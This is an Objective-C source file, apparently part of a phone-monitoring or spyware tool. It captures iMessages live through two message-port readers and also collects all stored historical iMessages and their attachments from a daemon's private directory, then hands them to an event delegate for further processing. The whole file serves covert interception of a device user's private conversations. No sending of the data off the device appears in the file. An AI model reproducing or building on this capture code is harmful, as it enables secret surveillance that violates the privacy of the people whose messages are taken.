//
//  IMessageCaptureManager.m
//  iMessageCaptureManager
//
//  Created by Makara Khloth on 2/1/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "IMessageCaptureManager.h"
#import "IMessageCaptureDAO.h"

#import "DefStd.h"
#import "EventCenter.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"
#import "DaemonPrivateHome.h"

@implementation IMessageCaptureManager

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
	}
	return (self);
}

- (void) startCapture {
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kiMessageMessagePort1 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kiMessageMessagePort2 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
}

- (void) stopCapture {
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kiMessageArchived];
	DLog(@"iMessage - imEvent = %@", imEvent);
    [unarchiver finishDecoding];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];
		for (FxEvent *imStructureEvent in imStructureEvents) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
		}
	}
	[unarchiver release];
}

#pragma mark - Historical events -

+ (NSArray *) alliMessages {
    NSArray *alliMessages = [NSArray array];
    @try {
        NSMutableArray *tempArray = [NSMutableArray array];
        NSString *privateHomePath = [DaemonPrivateHome daemonPrivateHome];
        NSString *attachmentPath = [privateHomePath stringByAppendingString:@"attachments/imiMessage/"];
        IMessageCaptureDAO *iMessageDAO = [[IMessageCaptureDAO alloc] init];
        [iMessageDAO setMAttachmentPath:attachmentPath];
        NSArray *tempAlliMessage = [iMessageDAO alliMessages];
        for (FxIMEvent *event in tempAlliMessage) {
            NSArray *events = [FxIMEventUtils digestIMEvent:event];
            [tempArray addObjectsFromArray:events];
        }
        [iMessageDAO release];
        alliMessages = tempArray;
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return (alliMessages);
}

+ (NSArray *) alliMessagesWithMax: (NSInteger) aMaxNumber {
    NSArray *someiMessages = [NSArray array];
    @try {
        NSMutableArray *tempArray = [NSMutableArray array];
        NSString *privateHomePath = [DaemonPrivateHome daemonPrivateHome];
        NSString *attachmentPath = [privateHomePath stringByAppendingString:@"attachments/imiMessage/"];
        IMessageCaptureDAO *iMessageDAO = [[IMessageCaptureDAO alloc] init];
        [iMessageDAO setMAttachmentPath:attachmentPath];
        NSArray *tempSomeiMessages = [iMessageDAO alliMessagesWithMax:aMaxNumber];
        for (FxIMEvent *event in tempSomeiMessages) {
            NSArray *events = [FxIMEventUtils digestIMEvent:event];
            [tempArray addObjectsFromArray:events];
        }
        [iMessageDAO release];
        someiMessages = tempArray;
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    DLog(@"Some iMessages is captured, %lu", (unsigned long)[someiMessages count]);
    return (someiMessages);
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
